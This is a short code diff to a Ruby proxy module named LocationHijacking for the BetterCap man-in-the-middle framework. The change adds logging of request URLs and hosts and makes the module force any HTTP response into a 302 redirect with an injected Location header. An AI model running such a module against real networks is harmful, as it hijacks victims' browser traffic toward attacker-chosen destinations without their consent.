@@ -40,10 +40,12 @@ class LocationHijacking < BetterCap::Proxy::Module
           end
         end
       end
-      if !found && !h.include?(@@location)
+      BetterCap::Logger.info request.url
+      BetterCap::Logger.info request.host
+      if !found && !@@location.include?(request.host)
         BetterCap::Logger.info "No Location header found, adding one now for #{@@location}"
         # Replace HTTP Response code with 302
-        response.headers.first.sub!('200', '302')
+        response.headers.first.sub!(/\d{3}/, '302')
         # This is an ugly hack to get around github issue #117
         response.headers.reject! { |header| header.empty? }
         # This is our payload line that is fine
